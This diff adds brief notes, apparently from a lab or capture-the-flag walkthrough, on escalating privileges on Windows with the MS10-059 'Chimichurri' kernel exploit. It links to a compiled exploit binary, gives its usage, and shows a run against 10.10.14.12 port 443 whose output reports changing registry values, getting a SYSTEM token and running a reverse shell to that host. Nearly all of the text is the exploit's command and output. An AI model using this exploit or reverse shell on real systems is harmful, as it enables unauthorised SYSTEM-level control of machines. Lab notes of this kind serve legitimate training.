@@ -1,0 +1,10 @@
+Download executeable from https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
+
+Chimichurri.exe
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
+
+C:\Users\tolis>chimichurri.exe 10.10.14.12 443
+chimichurri.exe 10.10.14.12 443
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...
+<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...
+<BR>/Chimichurri/-->Restoring default registry values...<BR>
